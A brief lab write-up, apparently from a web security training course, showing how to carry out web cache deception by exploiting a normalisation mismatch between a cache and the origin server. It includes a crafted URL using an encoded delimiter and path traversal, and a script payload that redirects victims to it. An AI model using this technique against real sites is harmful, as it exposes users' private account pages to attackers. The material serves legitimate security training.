# Using caching agent normalization to do web cache deception

In a similar manner, let’s craft an exploit and deliver it via XSS:

NOTE! For this attack to work, a delimiter that is processed by an origin server and not processed by caching agent is needed. In this example, `%23` is such delimiter discovered using fuzzing

```jsx
https://0a9800c503a69dfb80218ff200910032.web-security-academy.net/my-account%23%2f..%2fresources
```

![image.png](Using%20caching%20agent%20normalization%20to%20do%20web%20cache%20%201f9021737a8980c9ad54dc863e432a3d/image.png)

![image.png](Using%20caching%20agent%20normalization%20to%20do%20web%20cache%20%201f9021737a8980c9ad54dc863e432a3d/image%201.png)

```jsx
<script>document.location="https://0a9800c503a69dfb80218ff200910032.web-security-academy.net/my-account%23%2f..%2fresources"</script>
```

After exploit delivery:

![image.png](Using%20caching%20agent%20normalization%20to%20do%20web%20cache%20%201f9021737a8980c9ad54dc863e432a3d/image%202.png)